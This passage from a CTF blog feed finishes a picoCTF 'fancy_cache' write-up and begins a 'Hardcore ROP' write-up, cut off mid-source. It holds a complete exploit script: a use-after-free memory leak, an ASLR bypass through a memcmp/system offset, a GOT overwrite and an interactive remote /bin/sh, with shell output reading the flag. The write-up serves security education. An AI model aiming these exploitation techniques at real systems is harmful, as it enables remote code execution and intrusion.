</span></code></pre></td></tr></table></div></figure>


<ul>
<li>We request the key called &lsquo;printf&rsquo;; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">### modifications to client.py:</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Add an entry to the cache</span>
</span><span class='line'><span class="k">assert</span> <span class="n">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;AAAA____&#39;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'><span class="c"># Delete from cache</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">)</span>
</span><span class='line'><span class="c"># This is read into the old &quot;value&quot; struct (used to be 0x8, 0x0, *(AAAA____)). </span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="c"># This is read into the old &quot;key&quot; struct (used to be 0x7, 0x0, *(keyAAAA))</span>
</span><span class='line'><span class="c"># We supply the address of &#39;printf&#39;, so the check will pass &amp; we read whatever is at value-&gt;data</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="c"># Print the actual data!</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;printf&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gives the following output locally:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/fancy_cache<span class="nv">$ </span>python client.py
</span><span class='line'>AAAA____
</span><span class='line'>None
</span><span class='line'>None
</span><span class='line'>REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED
</span></code></pre></td></tr></table></div></figure>


<p>And for the remote server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/fancy_cache<span class="nv">$ </span>python client.py
</span><span class='line'>
</span><span class='line'>AAAA____
</span><span class='line'>None
</span><span class='line'>None
</span><span class='line'>ongratulations! Looks like you figured out how to <span class="nb">read </span>memory. This can can be a useful tool <span class="k">for</span> defeating ASLR :-<span class="o">)</span> Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html <span class="k">for</span> some hints on how to go from what you have to a shel
</span></code></pre></td></tr></table></div></figure>


<p>Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of <code>memcmp</code>, which we need to defeat ASLR. Using the same read memory trick, we grab the address of <code>memcmp</code>, which is stored at <code>0x804b014</code>. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to <code>0x804b014</code> by doing a cache_set call. Finally, we need to trigger <code>memcmp</code>, which now actually calls <code>system</code>. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what&rsquo;s going on):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pack4</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    Takes a 32 bit integer and returns a 4 byte string representing the</span>
</span><span class='line'><span class="sd">    number in little endian.</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">v</span> <span class="o">&lt;=</span> <span class="mh">0xffffffff</span>
</span><span class='line'>    <span class="c"># The &lt; is for little endian, the I is for a 4 byte unsigned int.</span>
</span><span class='line'>    <span class="c"># See https://docs.python.org/2/library/struct.html for more info.</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">unpack4</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;Does the opposite of pack4.&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">CACHE_GET</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">CACHE_SET</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="n">kNotFound</span> <span class="o">=</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">kFound</span> <span class="o">=</span> <span class="mh">0x1</span>
</span><span class='line'><span class="n">kCacheFull</span> <span class="o">=</span> <span class="mh">0x2</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_string</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pack4</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_string</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="n">size</span> <span class="o">=</span> <span class="n">unpack4</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">CACHE_GET</span><span class="p">))</span>
</span><span class='line'>    <span class="n">write_string</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">status</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="n">kNotFound</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>    <span class="k">assert</span> <span class="n">status</span> <span class="o">==</span> <span class="n">kFound</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">read_string</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># We need this modified function, because once we hit system(&#39;/bin/sh&#39;),</span>
</span><span class='line'><span class="c"># there will be no more data sent back in the way that the original </span>
</span><span class='line'><span class="c"># function expects. This causes it to b0rk.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">cache_get2</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">CACHE_GET</span><span class="p">))</span>
</span><span class='line'>    <span class="n">write_string</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">lifetime</span><span class="p">):</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">CACHE_SET</span><span class="p">))</span>
</span><span class='line'>    <span class="n">write_string</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">status</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="n">kCacheFull</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">False</span>
</span><span class='line'>    <span class="k">assert</span> <span class="n">status</span> <span class="o">==</span> <span class="n">kFound</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">write_string</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pack4</span><span class="p">(</span><span class="n">lifetime</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">4548</span><span class="p">))</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s">&#39;rw&#39;</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Command to be executed later, once we&#39;ve overwritten memcmp@plt.</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="s">&#39;/bin/sh</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Add an entry to the cache; we will use this command later to spawn the shell. </span>
</span><span class='line'><span class="n">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;payload&quot;</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    // Skip expired cache entries.</span>
</span><span class='line'><span class="sd">    if (entry-&gt;lifetime == 0) {</span>
</span><span class='line'><span class="sd">      continue;</span>
</span><span class='line'><span class="sd">    }</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="n">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;AAAA____&#39;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Request that value, causing it to be deleted from cache</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">// This is how the string struct looks like:</span>
</span><span class='line'><span class="sd">struct string {</span>
</span><span class='line'><span class="sd">  size_t length;</span>
</span><span class='line'><span class="sd">  size_t capacity;</span>
</span><span class='line'><span class="sd">  char *data;</span>
</span><span class='line'><span class="sd">};</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="c"># Now, we request the value of a key called &#39;\x04\x00\x00\x00\x00\x00\x00\...&quot;</span>
</span><span class='line'><span class="c"># but this is read into the old &quot;value&quot; struct (used to be 0x8, 0x0, *(AAAA____)),</span>
</span><span class='line'><span class="c"># because malloc will re-use this address.</span>
</span><span class='line'><span class="c"># Leak memcmp address @ 0x804b014</span>
</span><span class='line'><span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">pack4</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mh">0x804b014</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># This is read into the old &quot;key&quot; struct (used to be 0x7, 0x0, *(keyAAAA))</span>
</span><span class='line'><span class="c"># We supply the address of &#39;printf&#39;, so the check will pass &amp; we read whatever is at value-&gt;data</span>
</span><span class='line'><span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">pack4</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mh">0x8048310</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Grab memcmp address:</span>
</span><span class='line'><span class="n">addr_memcmp</span> <span class="o">=</span> <span class="n">unpack4</span><span class="p">(</span><span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;printf&#39;</span><span class="p">))</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Leaking memcmp address: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_memcmp</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Calculate system address:</span>
</span><span class='line'><span class="n">addr_system</span> <span class="o">=</span> <span class="n">addr_memcmp</span> <span class="o">-</span> <span class="mh">0x142870</span> <span class="o">+</span> <span class="mh">0x40100</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Calculated system address: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_system</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. </span>
</span><span class='line'><span class="c"># We&#39;d love to abuse our old cache entry again, but alas, the memory regions have again been </span>
</span><span class='line'><span class="c"># freed(), due to cache_get seeing a lifetime &lt;= 0.</span>
</span><span class='line'><span class="c"># We&#39;ll restore them, so we can abuse them again to write to 0x804b014.</span>
</span><span class='line'>
</span><span class='line'><span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">pack4</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mh">0x804b014</span><span class="p">))</span>
</span><span class='line'><span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">pack4</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pack4</span><span class="p">(</span><span class="mh">0x8048310</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Attempting to overwrite memcmp pointer...&quot;</span>
</span><span class='line'><span class="k">assert</span> <span class="n">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;printf&#39;</span><span class="p">,</span> <span class="n">pack4</span><span class="p">(</span><span class="n">addr_system</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Running {} on remote box&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get2</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Once you get the service to run a shell, this lets you send commands</span>
</span><span class='line'><span class="c"># to the shell and get the results back :-)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running it lands us a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/fancy_cache<span class="nv">$ </span>python client.py
</span><span class='line'>AAAA____
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaking memcmp address: 0xf7686870
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Calculated system address: 0xf7584100
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Attempting to overwrite memcmp pointer...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Running /bin/sh on remote box
</span><span class='line'>None
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1009<span class="o">(</span>fancy_cache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1009<span class="o">(</span>fancy_cache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1009<span class="o">(</span>fancy_cache<span class="o">)</span>
</span><span class='line'>ls /home/
</span><span class='line'>bleichenbacher
</span><span class='line'>easyoverflow
</span><span class='line'>ecb
</span><span class='line'>fancy_cache
</span><span class='line'>guess
</span><span class='line'>hardcore_owner
</span><span class='line'>lowentropy
</span><span class='line'>netsino
</span><span class='line'>policerecords
</span><span class='line'>ubuntu
</span><span class='line'>ls /home/fancy_cache
</span><span class='line'>fancy_cache
</span><span class='line'>fancy_cache.sh
</span><span class='line'>flag.txt
</span><span class='line'>cat /home/fancy_cache/flag.txt
</span><span class='line'>that_wasnt_so_free_after_all
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>that_wasnt_so_free_after_all</code>. Fancy indeed!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Hardcore ROP]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop/"/>
    <updated>2014-11-06T23:48:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop</id>
    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>

<!--more-->


<p>Upon inspecting the source of code of this weird program, we see the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">randop</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="n">seed</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAPLEN</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
